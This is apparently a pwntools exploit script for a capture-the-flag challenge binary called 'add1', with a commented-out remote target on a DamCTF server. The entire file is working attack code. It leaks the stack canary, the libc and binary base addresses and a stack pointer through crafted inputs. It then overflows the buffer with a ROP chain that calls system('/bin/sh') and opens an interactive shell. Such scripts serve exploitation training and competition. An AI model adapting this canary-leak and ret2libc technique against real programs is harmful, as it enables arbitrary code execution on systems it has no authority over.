from pwn import *

gdbscript = '''
c
'''

# p = remote("chals.damctf.xyz", 30123)
p = gdb.debug("./add1", gdbscript, env={"LD_PRELOAD" : "./libc.so.6"})
# p = process("./add1", env={"LD_PRELOAD": "./libc.so.6"})

payload  = b'0'
payload += b' '*0x18
p.sendlineafter(b': ', payload)
canary = u64(p.recvline()[0x19:0x20].rjust(8, b'\0'))

payload  = b'0'
payload += b' '*0x37
p.sendlineafter(b': ', payload)
libc_base = u64(p.recvline()[0x38:0x3e].ljust(8, b'\0')) - 0x29d90

payload  = b'0'
payload += b' '*0x47
p.sendlineafter(b': ', payload)
bin_base = u64(p.recvline()[0x48:0x4e].ljust(8, b'\0')) - 0x157a5

payload  = b'0'
payload += b' '*0x57
p.sendlineafter(b': ', payload)
stack = u64(p.recvline()[0x58:0x5e].ljust(8, b'\0'))

log.info(f"canary    = {hex(canary)}")
log.info(f"libc base = {hex(libc_base)}")
log.info(f"bin_base  = {hex(bin_base)}")
log.info(f"stack     = {hex(stack)}")

landing_pad = bin_base  + 0x17732

rop_pop_rdi = libc_base + 0x2a3e5
rop_ret     = libc_base + 0x2a3e6
binsh       = libc_base + 0x1d8678
system      = libc_base + 0x50d70

payload  = b'A'*0x18
payload += p64(canary)
payload += b'A'*0x10
payload += p64(stack)
payload += p64(landing_pad)
payload += b'A'*0x08
payload += p64(rop_ret)
payload += p64(rop_pop_rdi)
payload += p64(binsh)
payload += p64(system)
p.sendlineafter(b': ', payload)

p.interactive()
